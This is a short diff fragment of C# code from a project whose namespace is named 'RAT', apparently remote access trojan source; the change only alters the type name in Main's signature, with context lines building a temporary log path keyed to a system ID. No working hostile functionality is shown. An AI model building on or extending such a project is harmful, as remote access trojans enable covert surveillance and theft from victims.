@@ -71,7 +71,7 @@ namespace RAT
             Path.GetTempPath()+SystemID
         };
 
-        static void Main(string[] args)
+        static void Main(String[] args)
         {
             SystemID = "LOG_"+uid();
             try
